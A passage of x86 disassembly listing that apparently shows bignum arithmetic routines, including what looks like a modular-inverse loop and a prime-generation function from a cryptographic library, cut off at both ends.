  40557a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40557d:	50                   	push   %eax
  40557e:	e8 c8 ee ff ff       	call   0x40444b
  405583:	85 c0                	test   %eax,%eax
  405585:	78 19                	js     0x4055a0
  405587:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40558a:	50                   	push   %eax
  40558b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40558e:	50                   	push   %eax
  40558f:	50                   	push   %eax
  405590:	e8 59 f0 ff ff       	call   0x4045ee
  405595:	8b f0                	mov    %eax,%esi
  405597:	85 f6                	test   %esi,%esi
  405599:	75 5a                	jne    0x4055f5
  40559b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40559e:	eb 17                	jmp    0x4055b7
  4055a0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4055a3:	50                   	push   %eax
  4055a4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4055a7:	50                   	push   %eax
  4055a8:	50                   	push   %eax
  4055a9:	e8 40 f0 ff ff       	call   0x4045ee
  4055ae:	8b f0                	mov    %eax,%esi
  4055b0:	85 f6                	test   %esi,%esi
  4055b2:	75 41                	jne    0x4055f5
  4055b4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4055b7:	53                   	push   %ebx
  4055b8:	50                   	push   %eax
  4055b9:	e8 66 ed ff ff       	call   0x404324
  4055be:	8b f0                	mov    %eax,%esi
  4055c0:	85 f6                	test   %esi,%esi
  4055c2:	75 31                	jne    0x4055f5
  4055c4:	6a 00                	push   $0x0
  4055c6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4055c9:	50                   	push   %eax
  4055ca:	e8 14 ef ff ff       	call   0x4044e3
  4055cf:	85 c0                	test   %eax,%eax
  4055d1:	0f 85 69 ff ff ff    	jne    0x405540
  4055d7:	57                   	push   %edi
  4055d8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4055db:	50                   	push   %eax
  4055dc:	e8 79 ec ff ff       	call   0x40425a
  4055e1:	8b f0                	mov    %eax,%esi
  4055e3:	85 f6                	test   %esi,%esi
  4055e5:	75 0e                	jne    0x4055f5
  4055e7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4055ea:	50                   	push   %eax
  4055eb:	ff 75 08             	push   0x8(%ebp)
  4055ee:	e8 f7 e4 ff ff       	call   0x403aea
  4055f3:	8b f0                	mov    %eax,%esi
  4055f5:	5b                   	pop    %ebx
  4055f6:	5f                   	pop    %edi
  4055f7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4055fa:	50                   	push   %eax
  4055fb:	e8 c0 e3 ff ff       	call   0x4039c0
  405600:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405603:	50                   	push   %eax
  405604:	e8 b7 e3 ff ff       	call   0x4039c0
  405609:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40560c:	50                   	push   %eax
  40560d:	e8 ae e3 ff ff       	call   0x4039c0
  405612:	8b c6                	mov    %esi,%eax
  405614:	5e                   	pop    %esi
  405615:	8b e5                	mov    %ebp,%esp
  405617:	5d                   	pop    %ebp
  405618:	c2 0c 00             	ret    $0xc
  40561b:	83 ec 6c             	sub    $0x6c,%esp
  40561e:	55                   	push   %ebp
  40561f:	57                   	push   %edi
  405620:	8b bc 24 80 00 00 00 	mov    0x80(%esp),%edi
  405627:	33 ed                	xor    %ebp,%ebp
  405629:	55                   	push   %ebp
  40562a:	57                   	push   %edi
  40562b:	e8 b3 ee ff ff       	call   0x4044e3
  405630:	85 c0                	test   %eax,%eax
  405632:	7f 08                	jg     0x40563c
  405634:	6a fc                	push   $0xfffffffc
  405636:	58                   	pop    %eax
  405637:	e9 c4 03 00 00       	jmp    0x405a00
  40563c:	56                   	push   %esi
  40563d:	8d 44 24 54          	lea    0x54(%esp),%eax
  405641:	50                   	push   %eax
  405642:	e8 60 e3 ff ff       	call   0x4039a7
  405647:	8d 44 24 18          	lea    0x18(%esp),%eax
  40564b:	50                   	push   %eax
  40564c:	e8 56 e3 ff ff       	call   0x4039a7
  405651:	8d 44 24 24          	lea    0x24(%esp),%eax
  405655:	50                   	push   %eax
  405656:	e8 4c e3 ff ff       	call   0x4039a7
  40565b:	8d 44 24 30          	lea    0x30(%esp),%eax
  40565f:	50                   	push   %eax
  405660:	e8 42 e3 ff ff       	call   0x4039a7
  405665:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  405669:	50                   	push   %eax
  40566a:	e8 38 e3 ff ff       	call   0x4039a7
  40566f:	8d 44 24 60          	lea    0x60(%esp),%eax
  405673:	50                   	push   %eax
  405674:	e8 2e e3 ff ff       	call   0x4039a7
  405679:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40567d:	50                   	push   %eax
  40567e:	e8 24 e3 ff ff       	call   0x4039a7
  405683:	8d 44 24 0c          	lea    0xc(%esp),%eax
  405687:	50                   	push   %eax
  405688:	e8 1a e3 ff ff       	call   0x4039a7
  40568d:	8d 44 24 48          	lea    0x48(%esp),%eax
  405691:	50                   	push   %eax
  405692:	e8 10 e3 ff ff       	call   0x4039a7
  405697:	57                   	push   %edi
  405698:	ff b4 24 84 00 00 00 	push   0x84(%esp)
  40569f:	8d 44 24 74          	lea    0x74(%esp),%eax
  4056a3:	50                   	push   %eax
  4056a4:	e8 f7 fd ff ff       	call   0x4054a0
  4056a9:	8b f0                	mov    %eax,%esi
  4056ab:	85 f6                	test   %esi,%esi
  4056ad:	0f 85 f0 02 00 00    	jne    0x4059a3
  4056b3:	53                   	push   %ebx
  4056b4:	33 db                	xor    %ebx,%ebx
  4056b6:	8d 44 24 70          	lea    0x70(%esp),%eax
  4056ba:	43                   	inc    %ebx
  4056bb:	53                   	push   %ebx
  4056bc:	50                   	push   %eax
  4056bd:	e8 21 ee ff ff       	call   0x4044e3
  4056c2:	85 c0                	test   %eax,%eax
  4056c4:	74 08                	je     0x4056ce
  4056c6:	6a f2                	push   $0xfffffff2
  4056c8:	5e                   	pop    %esi
  4056c9:	e9 d4 02 00 00       	jmp    0x4059a2
  4056ce:	57                   	push   %edi
  4056cf:	ff b4 24 88 00 00 00 	push   0x88(%esp)
  4056d6:	8d 44 24 60          	lea    0x60(%esp),%eax
  4056da:	50                   	push   %eax
  4056db:	e8 c2 f6 ff ff       	call   0x404da2
  4056e0:	8b f0                	mov    %eax,%esi
  4056e2:	85 f6                	test   %esi,%esi
  4056e4:	0f 85 b8 02 00 00    	jne    0x4059a2
  4056ea:	8d 44 24 58          	lea    0x58(%esp),%eax
  4056ee:	50                   	push   %eax
  4056ef:	8d 44 24 20          	lea    0x20(%esp),%eax
  4056f3:	50                   	push   %eax
  4056f4:	e8 f1 e3 ff ff       	call   0x403aea
  4056f9:	8b f0                	mov    %eax,%esi
  4056fb:	85 f6                	test   %esi,%esi
  4056fd:	0f 85 9f 02 00 00    	jne    0x4059a2
  405703:	57                   	push   %edi
  405704:	8d 44 24 68          	lea    0x68(%esp),%eax
  405708:	50                   	push   %eax
  405709:	e8 dc e3 ff ff       	call   0x403aea
  40570e:	8b f0                	mov    %eax,%esi
  405710:	85 f6                	test   %esi,%esi
  405712:	0f 85 8a 02 00 00    	jne    0x4059a2
  405718:	57                   	push   %edi
  405719:	8d 44 24 44          	lea    0x44(%esp),%eax
  40571d:	50                   	push   %eax
  40571e:	e8 c7 e3 ff ff       	call   0x403aea
  405723:	8b f0                	mov    %eax,%esi
  405725:	85 f6                	test   %esi,%esi
  405727:	0f 85 75 02 00 00    	jne    0x4059a2
  40572d:	53                   	push   %ebx
  40572e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  405732:	50                   	push   %eax
  405733:	e8 bb e5 ff ff       	call   0x403cf3
  405738:	8b f0                	mov    %eax,%esi
  40573a:	85 f6                	test   %esi,%esi
  40573c:	0f 85 60 02 00 00    	jne    0x4059a2
  405742:	55                   	push   %ebp
  405743:	8d 44 24 38          	lea    0x38(%esp),%eax
  405747:	50                   	push   %eax
  405748:	e8 a6 e5 ff ff       	call   0x403cf3
  40574d:	8b f0                	mov    %eax,%esi
  40574f:	85 f6                	test   %esi,%esi
  405751:	0f 85 4b 02 00 00    	jne    0x4059a2
  405757:	55                   	push   %ebp
  405758:	8d 44 24 14          	lea    0x14(%esp),%eax
  40575c:	50                   	push   %eax
  40575d:	e8 91 e5 ff ff       	call   0x403cf3
  405762:	8b f0                	mov    %eax,%esi
  405764:	85 f6                	test   %esi,%esi
  405766:	0f 85 36 02 00 00    	jne    0x4059a2
  40576c:	53                   	push   %ebx
  40576d:	8d 44 24 50          	lea    0x50(%esp),%eax
  405771:	50                   	push   %eax
  405772:	e8 7c e5 ff ff       	call   0x403cf3
  405777:	eb 79                	jmp    0x4057f2
  405779:	53                   	push   %ebx
  40577a:	8d 44 24 20          	lea    0x20(%esp),%eax
  40577e:	50                   	push   %eax
  40577f:	e8 a0 eb ff ff       	call   0x404324
  405784:	8b f0                	mov    %eax,%esi
  405786:	85 f6                	test   %esi,%esi
  405788:	0f 85 14 02 00 00    	jne    0x4059a2
  40578e:	8b 44 24 30          	mov    0x30(%esp),%eax
  405792:	84 18                	test   %bl,(%eax)
  405794:	75 08                	jne    0x40579e
  405796:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40579a:	84 18                	test   %bl,(%eax)
  40579c:	74 34                	je     0x4057d2
  40579e:	8d 44 24 64          	lea    0x64(%esp),%eax
  4057a2:	50                   	push   %eax
  4057a3:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4057a7:	50                   	push   %eax
  4057a8:	50                   	push   %eax
  4057a9:	e8 d7 ee ff ff       	call   0x404685
  4057ae:	8b f0                	mov    %eax,%esi
  4057b0:	85 f6                	test   %esi,%esi
  4057b2:	0f 85 ea 01 00 00    	jne    0x4059a2
  4057b8:	8d 44 24 58          	lea    0x58(%esp),%eax
  4057bc:	50                   	push   %eax
  4057bd:	8d 44 24 38          	lea    0x38(%esp),%eax
  4057c1:	50                   	push   %eax
  4057c2:	50                   	push   %eax
  4057c3:	e8 15 ef ff ff       	call   0x4046dd
  4057c8:	8b f0                	mov    %eax,%esi
  4057ca:	85 f6                	test   %esi,%esi
  4057cc:	0f 85 d0 01 00 00    	jne    0x4059a2
  4057d2:	53                   	push   %ebx
  4057d3:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4057d7:	50                   	push   %eax
  4057d8:	e8 47 eb ff ff       	call   0x404324
  4057dd:	8b f0                	mov    %eax,%esi
  4057df:	85 f6                	test   %esi,%esi
  4057e1:	0f 85 bb 01 00 00    	jne    0x4059a2
  4057e7:	53                   	push   %ebx
  4057e8:	8d 44 24 38          	lea    0x38(%esp),%eax
  4057ec:	50                   	push   %eax
  4057ed:	e8 32 eb ff ff       	call   0x404324
  4057f2:	8b f0                	mov    %eax,%esi
  4057f4:	85 f6                	test   %esi,%esi
  4057f6:	0f 85 a6 01 00 00    	jne    0x4059a2
  4057fc:	8b 44 24 24          	mov    0x24(%esp),%eax
  405800:	84 18                	test   %bl,(%eax)
  405802:	0f 84 71 ff ff ff    	je     0x405779
  405808:	eb 7f                	jmp    0x405889
  40580a:	53                   	push   %ebx
  40580b:	50                   	push   %eax
  40580c:	e8 13 eb ff ff       	call   0x404324
  405811:	8b f0                	mov    %eax,%esi
  405813:	85 f6                	test   %esi,%esi
  405815:	0f 85 87 01 00 00    	jne    0x4059a2
  40581b:	8b 44 24 18          	mov    0x18(%esp),%eax
  40581f:	84 18                	test   %bl,(%eax)
  405821:	75 08                	jne    0x40582b
  405823:	8b 44 24 54          	mov    0x54(%esp),%eax
  405827:	84 18                	test   %bl,(%eax)
  405829:	74 34                	je     0x40585f
  40582b:	8d 44 24 64          	lea    0x64(%esp),%eax
  40582f:	50                   	push   %eax
  405830:	8d 44 24 14          	lea    0x14(%esp),%eax
  405834:	50                   	push   %eax
  405835:	50                   	push   %eax
  405836:	e8 4a ee ff ff       	call   0x404685
  40583b:	8b f0                	mov    %eax,%esi
  40583d:	85 f6                	test   %esi,%esi
  40583f:	0f 85 5d 01 00 00    	jne    0x4059a2
  405845:	8d 44 24 58          	lea    0x58(%esp),%eax
  405849:	50                   	push   %eax
  40584a:	8d 44 24 50          	lea    0x50(%esp),%eax
  40584e:	50                   	push   %eax
  40584f:	50                   	push   %eax
  405850:	e8 88 ee ff ff       	call   0x4046dd
  405855:	8b f0                	mov    %eax,%esi
  405857:	85 f6                	test   %esi,%esi
  405859:	0f 85 43 01 00 00    	jne    0x4059a2
  40585f:	53                   	push   %ebx
  405860:	8d 44 24 14          	lea    0x14(%esp),%eax
  405864:	50                   	push   %eax
  405865:	e8 ba ea ff ff       	call   0x404324
  40586a:	8b f0                	mov    %eax,%esi
  40586c:	85 f6                	test   %esi,%esi
  40586e:	0f 85 2e 01 00 00    	jne    0x4059a2
  405874:	53                   	push   %ebx
  405875:	8d 44 24 50          	lea    0x50(%esp),%eax
  405879:	50                   	push   %eax
  40587a:	e8 a5 ea ff ff       	call   0x404324
  40587f:	8b f0                	mov    %eax,%esi
  405881:	85 f6                	test   %esi,%esi
  405883:	0f 85 19 01 00 00    	jne    0x4059a2
  405889:	8b 44 24 48          	mov    0x48(%esp),%eax
  40588d:	84 18                	test   %bl,(%eax)
  40588f:	8d 44 24 40          	lea    0x40(%esp),%eax
  405893:	0f 84 71 ff ff ff    	je     0x40580a
  405899:	50                   	push   %eax
  40589a:	8d 44 24 20          	lea    0x20(%esp),%eax
  40589e:	50                   	push   %eax
  40589f:	e8 a7 eb ff ff       	call   0x40444b
  4058a4:	85 c0                	test   %eax,%eax
  4058a6:	78 40                	js     0x4058e8
  4058a8:	8d 44 24 40          	lea    0x40(%esp),%eax
  4058ac:	50                   	push   %eax
  4058ad:	8d 44 24 20          	lea    0x20(%esp),%eax
  4058b1:	50                   	push   %eax
  4058b2:	50                   	push   %eax
  4058b3:	e8 25 ee ff ff       	call   0x4046dd
  4058b8:	8b f0                	mov    %eax,%esi
  4058ba:	85 f6                	test   %esi,%esi
  4058bc:	0f 85 e0 00 00 00    	jne    0x4059a2
  4058c2:	8d 44 24 10          	lea    0x10(%esp),%eax
  4058c6:	50                   	push   %eax
  4058c7:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4058cb:	50                   	push   %eax
  4058cc:	50                   	push   %eax
  4058cd:	e8 0b ee ff ff       	call   0x4046dd
  4058d2:	8b f0                	mov    %eax,%esi
  4058d4:	85 f6                	test   %esi,%esi
  4058d6:	0f 85 c6 00 00 00    	jne    0x4059a2
  4058dc:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  4058e0:	50                   	push   %eax
  4058e1:	8d 44 24 38          	lea    0x38(%esp),%eax
  4058e5:	50                   	push   %eax
  4058e6:	eb 3e                	jmp    0x405926
  4058e8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4058ec:	50                   	push   %eax
  4058ed:	8d 44 24 44          	lea    0x44(%esp),%eax
  4058f1:	50                   	push   %eax
  4058f2:	50                   	push   %eax
  4058f3:	e8 e5 ed ff ff       	call   0x4046dd
  4058f8:	8b f0                	mov    %eax,%esi
  4058fa:	85 f6                	test   %esi,%esi
  4058fc:	0f 85 a0 00 00 00    	jne    0x4059a2
  405902:	8d 44 24 28          	lea    0x28(%esp),%eax
  405906:	50                   	push   %eax
  405907:	8d 44 24 14          	lea    0x14(%esp),%eax
  40590b:	50                   	push   %eax
  40590c:	50                   	push   %eax
  40590d:	e8 cb ed ff ff       	call   0x4046dd
  405912:	8b f0                	mov    %eax,%esi
  405914:	85 f6                	test   %esi,%esi
  405916:	0f 85 86 00 00 00    	jne    0x4059a2
  40591c:	8d 44 24 34          	lea    0x34(%esp),%eax
  405920:	50                   	push   %eax
  405921:	8d 44 24 50          	lea    0x50(%esp),%eax
  405925:	50                   	push   %eax
  405926:	50                   	push   %eax
  405927:	e8 b1 ed ff ff       	call   0x4046dd
  40592c:	8b f0                	mov    %eax,%esi
  40592e:	85 f6                	test   %esi,%esi
  405930:	75 70                	jne    0x4059a2
  405932:	55                   	push   %ebp
  405933:	8d 44 24 20          	lea    0x20(%esp),%eax
  405937:	50                   	push   %eax
  405938:	e8 a6 eb ff ff       	call   0x4044e3
  40593d:	85 c0                	test   %eax,%eax
  40593f:	0f 85 b7 fe ff ff    	jne    0x4057fc
  405945:	eb 10                	jmp    0x405957
  405947:	8d 44 24 18          	lea    0x18(%esp),%eax
  40594b:	50                   	push   %eax
  40594c:	e8 34 ed ff ff       	call   0x404685
  405951:	8b f0                	mov    %eax,%esi
  405953:	85 f6                	test   %esi,%esi
  405955:	75 4b                	jne    0x4059a2
  405957:	55                   	push   %ebp
  405958:	8d 44 24 14          	lea    0x14(%esp),%eax
  40595c:	50                   	push   %eax
  40595d:	e8 81 eb ff ff       	call   0x4044e3
  405962:	85 c0                	test   %eax,%eax
  405964:	8d 44 24 10          	lea    0x10(%esp),%eax
  405968:	57                   	push   %edi
  405969:	50                   	push   %eax
  40596a:	78 db                	js     0x405947
  40596c:	eb 18                	jmp    0x405986
  40596e:	57                   	push   %edi
  40596f:	50                   	push   %eax
  405970:	8d 44 24 18          	lea    0x18(%esp),%eax
  405974:	50                   	push   %eax
  405975:	e8 63 ed ff ff       	call   0x4046dd
  40597a:	8b f0                	mov    %eax,%esi
  40597c:	85 f6                	test   %esi,%esi
  40597e:	75 22                	jne    0x4059a2
  405980:	57                   	push   %edi
  405981:	8d 44 24 14          	lea    0x14(%esp),%eax
  405985:	50                   	push   %eax
  405986:	e8 c0 ea ff ff       	call   0x40444b
  40598b:	85 c0                	test   %eax,%eax
  40598d:	8d 44 24 10          	lea    0x10(%esp),%eax
  405991:	79 db                	jns    0x40596e
  405993:	50                   	push   %eax
  405994:	ff b4 24 84 00 00 00 	push   0x84(%esp)
  40599b:	e8 4a e1 ff ff       	call   0x403aea
  4059a0:	8b f0                	mov    %eax,%esi
  4059a2:	5b                   	pop    %ebx
  4059a3:	8d 44 24 54          	lea    0x54(%esp),%eax
  4059a7:	50                   	push   %eax
  4059a8:	e8 13 e0 ff ff       	call   0x4039c0
  4059ad:	8d 44 24 18          	lea    0x18(%esp),%eax
  4059b1:	50                   	push   %eax
  4059b2:	e8 09 e0 ff ff       	call   0x4039c0
  4059b7:	8d 44 24 24          	lea    0x24(%esp),%eax
  4059bb:	50                   	push   %eax
  4059bc:	e8 ff df ff ff       	call   0x4039c0
  4059c1:	8d 44 24 30          	lea    0x30(%esp),%eax
  4059c5:	50                   	push   %eax
  4059c6:	e8 f5 df ff ff       	call   0x4039c0
  4059cb:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4059cf:	50                   	push   %eax
  4059d0:	e8 eb df ff ff       	call   0x4039c0
  4059d5:	8d 44 24 60          	lea    0x60(%esp),%eax
  4059d9:	50                   	push   %eax
  4059da:	e8 e1 df ff ff       	call   0x4039c0
  4059df:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  4059e3:	50                   	push   %eax
  4059e4:	e8 d7 df ff ff       	call   0x4039c0
  4059e9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4059ed:	50                   	push   %eax
  4059ee:	e8 cd df ff ff       	call   0x4039c0
  4059f3:	8d 44 24 48          	lea    0x48(%esp),%eax
  4059f7:	50                   	push   %eax
  4059f8:	e8 c3 df ff ff       	call   0x4039c0
  4059fd:	8b c6                	mov    %esi,%eax
  4059ff:	5e                   	pop    %esi
  405a00:	5f                   	pop    %edi
  405a01:	5d                   	pop    %ebp
  405a02:	83 c4 6c             	add    $0x6c,%esp
  405a05:	c2 0c 00             	ret    $0xc
  405a08:	55                   	push   %ebp
  405a09:	8b ec                	mov    %esp,%ebp
  405a0b:	83 ec 0c             	sub    $0xc,%esp
  405a0e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405a11:	6a 00                	push   $0x0
  405a13:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  405a1a:	8b 41 04             	mov    0x4(%ecx),%eax
  405a1d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405a20:	8b 41 08             	mov    0x8(%ecx),%eax
  405a23:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a26:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a29:	50                   	push   %eax
  405a2a:	e8 b4 ea ff ff       	call   0x4044e3
  405a2f:	85 c0                	test   %eax,%eax
  405a31:	74 49                	je     0x405a7c
  405a33:	6a 01                	push   $0x1
  405a35:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a38:	50                   	push   %eax
  405a39:	e8 a5 ea ff ff       	call   0x4044e3
  405a3e:	85 c0                	test   %eax,%eax
  405a40:	74 3a                	je     0x405a7c
  405a42:	6a 02                	push   $0x2
  405a44:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a47:	50                   	push   %eax
  405a48:	e8 96 ea ff ff       	call   0x4044e3
  405a4d:	85 c0                	test   %eax,%eax
  405a4f:	74 2e                	je     0x405a7f
  405a51:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a54:	50                   	push   %eax
  405a55:	e8 72 06 00 00       	call   0x4060cc
  405a5a:	8b c8                	mov    %eax,%ecx
  405a5c:	85 c9                	test   %ecx,%ecx
  405a5e:	74 0b                	je     0x405a6b
  405a60:	8d 41 ff             	lea    -0x1(%ecx),%eax
  405a63:	f7 d8                	neg    %eax
  405a65:	1b c0                	sbb    %eax,%eax
  405a67:	23 c1                	and    %ecx,%eax
  405a69:	eb 14                	jmp    0x405a7f
  405a6b:	ff 75 10             	push   0x10(%ebp)
  405a6e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a71:	ff 75 0c             	push   0xc(%ebp)
  405a74:	50                   	push   %eax
  405a75:	e8 a9 06 00 00       	call   0x406123
  405a7a:	eb 03                	jmp    0x405a7f
  405a7c:	6a f2                	push   $0xfffffff2
  405a7e:	58                   	pop    %eax
  405a7f:	8b e5                	mov    %ebp,%esp
  405a81:	5d                   	pop    %ebp
  405a82:	c2 0c 00             	ret    $0xc
  405a85:	83 ec 0c             	sub    $0xc,%esp
  405a88:	53                   	push   %ebx
  405a89:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  405a8d:	8d 43 fd             	lea    -0x3(%ebx),%eax
  405a90:	3d fd 1f 00 00       	cmp    $0x1ffd,%eax
  405a95:	0f 87 81 01 00 00    	ja     0x405c1c
  405a9b:	55                   	push   %ebp
  405a9c:	56                   	push   %esi
  405a9d:	57                   	push   %edi
  405a9e:	8d 44 24 10          	lea    0x10(%esp),%eax
  405aa2:	50                   	push   %eax
  405aa3:	e8 ff de ff ff       	call   0x4039a7
  405aa8:	8b 6c 24 30          	mov    0x30(%esp),%ebp
  405aac:	f6 c3 1f             	test   $0x1f,%bl
  405aaf:	8b 7c 24 20          	mov    0x20(%esp),%edi
  405ab3:	8b c3                	mov    %ebx,%eax
  405ab5:	55                   	push   %ebp
  405ab6:	ff 74 24 30          	push   0x30(%esp)
  405aba:	6a 00                	push   $0x0
  405abc:	59                   	pop    %ecx
  405abd:	0f 95 c1             	setne  %cl
  405ac0:	c1 e8 05             	shr    $0x5,%eax
  405ac3:	03 c8                	add    %eax,%ecx
  405ac5:	c1 e1 02             	shl    $0x2,%ecx
  405ac8:	51                   	push   %ecx
  405ac9:	57                   	push   %edi
  405aca:	e8 8e f9 ff ff       	call   0x40545d
  405acf:	8b f0                	mov    %eax,%esi
  405ad1:	85 f6                	test   %esi,%esi
  405ad3:	0f 85 32 01 00 00    	jne    0x405c0b
  405ad9:	57                   	push   %edi
  405ada:	e8 47 e3 ff ff       	call   0x403e26
  405adf:	3b c3                	cmp    %ebx,%eax
  405ae1:	76 14                	jbe    0x405af7
  405ae3:	2b c3                	sub    %ebx,%eax
  405ae5:	40                   	inc    %eax
  405ae6:	50                   	push   %eax
  405ae7:	57                   	push   %edi
  405ae8:	e8 37 e8 ff ff       	call   0x404324
  405aed:	8b f0                	mov    %eax,%esi
  405aef:	85 f6                	test   %esi,%esi
  405af1:	0f 85 14 01 00 00    	jne    0x405c0b
  405af7:	6a 01                	push   $0x1
  405af9:	8d 43 ff             	lea    -0x1(%ebx),%eax
  405afc:	50                   	push   %eax
  405afd:	57                   	push   %edi
  405afe:	e8 6c e2 ff ff       	call   0x403d6f
  405b03:	8b 47 08             	mov    0x8(%edi),%eax
  405b06:	83 08 01             	orl    $0x1,(%eax)
  405b09:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  405b0e:	74 43                	je     0x405b53
  405b10:	8b 47 08             	mov    0x8(%edi),%eax
  405b13:	6a 03                	push   $0x3
  405b15:	57                   	push   %edi
  405b16:	83 08 02             	orl    $0x2,(%eax)
  405b19:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  405b1d:	50                   	push   %eax
  405b1e:	e8 e8 f2 ff ff       	call   0x404e0b
  405b23:	8b f0                	mov    %eax,%esi
  405b25:	85 f6                	test   %esi,%esi
  405b27:	0f 85 de 00 00 00    	jne    0x405c0b
  405b2d:	39 44 24 24          	cmp    %eax,0x24(%esp)
  405b31:	75 36                	jne    0x405b69
  405b33:	6a 08                	push   $0x8
  405b35:	eb 3b                	jmp    0x405b72
  405b37:	83 fe f2             	cmp    $0xfffffff2,%esi
  405b3a:	0f 85 cb 00 00 00    	jne    0x405c0b
  405b40:	6a 02                	push   $0x2
  405b42:	57                   	push   %edi
  405b43:	57                   	push   %edi
  405b44:	e8 ec eb ff ff       	call   0x404735
  405b49:	8b f0                	mov    %eax,%esi
  405b4b:	85 f6                	test   %esi,%esi
  405b4d:	0f 85 b8 00 00 00    	jne    0x405c0b
  405b53:	55                   	push   %ebp
  405b54:	ff 74 24 30          	push   0x30(%esp)
  405b58:	57                   	push   %edi
  405b59:	e8 aa fe ff ff       	call   0x405a08
  405b5e:	8b f0                	mov    %eax,%esi
  405b60:	85 f6                	test   %esi,%esi
  405b62:	75 d3                	jne    0x405b37
  405b64:	e9 a2 00 00 00       	jmp    0x405c0b
  405b69:	83 7c 24 24 01       	cmpl   $0x1,0x24(%esp)
  405b6e:	75 13                	jne    0x405b83
  405b70:	6a 04                	push   $0x4
  405b72:	57                   	push   %edi
  405b73:	57                   	push   %edi
  405b74:	e8 bc eb ff ff       	call   0x404735
  405b79:	8b f0                	mov    %eax,%esi
  405b7b:	85 f6                	test   %esi,%esi
  405b7d:	0f 85 88 00 00 00    	jne    0x405c0b
  405b83:	57                   	push   %edi
  405b84:	8d 44 24 14          	lea    0x14(%esp),%eax
  405b88:	50                   	push   %eax
  405b89:	e8 5c df ff ff       	call   0x403aea
  405b8e:	8b f0                	mov    %eax,%esi
  405b90:	85 f6                	test   %esi,%esi
  405b92:	75 77                	jne    0x405c0b
  405b94:	6a 01                	push   $0x1
  405b96:	8d 44 24 14          	lea    0x14(%esp),%eax
  405b9a:	50                   	push   %eax
  405b9b:	e8 84 e7 ff ff       	call   0x404324
  405ba0:	eb 63                	jmp    0x405c05
  405ba2:	57                   	push   %edi
  405ba3:	e8 24 05 00 00       	call   0x4060cc
  405ba8:	8b f0                	mov    %eax,%esi
  405baa:	85 f6                	test   %esi,%esi
  405bac:	75 36                	jne    0x405be4
  405bae:	8d 44 24 10          	lea    0x10(%esp),%eax
  405bb2:	50                   	push   %eax
  405bb3:	e8 14 05 00 00       	call   0x4060cc
  405bb8:	8b f0                	mov    %eax,%esi
  405bba:	85 f6                	test   %esi,%esi
  405bbc:	75 26                	jne    0x405be4
  405bbe:	55                   	push   %ebp
  405bbf:	ff 74 24 30          	push   0x30(%esp)
  405bc3:	57                   	push   %edi
  405bc4:	e8 5a 05 00 00       	call   0x406123
  405bc9:	8b f0                	mov    %eax,%esi
  405bcb:	85 f6                	test   %esi,%esi
  405bcd:	75 15                	jne    0x405be4
  405bcf:	55                   	push   %ebp
  405bd0:	ff 74 24 30          	push   0x30(%esp)
  405bd4:	8d 44 24 18          	lea    0x18(%esp),%eax
  405bd8:	50                   	push   %eax
  405bd9:	e8 45 05 00 00       	call   0x406123
  405bde:	8b f0                	mov    %eax,%esi
  405be0:	85 f6                	test   %esi,%esi
  405be2:	74 27                	je     0x405c0b
  405be4:	83 fe f2             	cmp    $0xfffffff2,%esi
  405be7:	75 22                	jne    0x405c0b
  405be9:	6a 0c                	push   $0xc
  405beb:	57                   	push   %edi
  405bec:	57                   	push   %edi
  405bed:	e8 43 eb ff ff       	call   0x404735
  405bf2:	8b f0                	mov    %eax,%esi
  405bf4:	85 f6                	test   %esi,%esi
  405bf6:	75 13                	jne    0x405c0b
  405bf8:	6a 06                	push   $0x6
  405bfa:	8d 44 24 14          	lea    0x14(%esp),%eax
  405bfe:	50                   	push   %eax
  405bff:	50                   	push   %eax
  405c00:	e8 30 eb ff ff       	call   0x404735
  405c05:	8b f0                	mov    %eax,%esi
  405c07:	85 f6                	test   %esi,%esi
  405c09:	74 97                	je     0x405ba2
  405c0b:	8d 44 24 10          	lea    0x10(%esp),%eax
  405c0f:	50                   	push   %eax
  405c10:	e8 ab dd ff ff       	call   0x4039c0
  405c15:	5f                   	pop    %edi
  405c16:	8b c6                	mov    %esi,%eax
  405c18:	5e                   	pop    %esi
  405c19:	5d                   	pop    %ebp
  405c1a:	eb 03                	jmp    0x405c1f
  405c1c:	6a fc                	push   $0xfffffffc
  405c1e:	58                   	pop    %eax
  405c1f:	5b                   	pop    %ebx
  405c20:	83 c4 0c             	add    $0xc,%esp
  405c23:	c2 14 00             	ret    $0x14
  405c26:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c2a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405c2e:	85 c0                	test   %eax,%eax
  405c30:	74 0c                	je     0x405c3e
  405c32:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  405c38:	8d 49 04             	lea    0x4(%ecx),%ecx
  405c3b:	48                   	dec    %eax
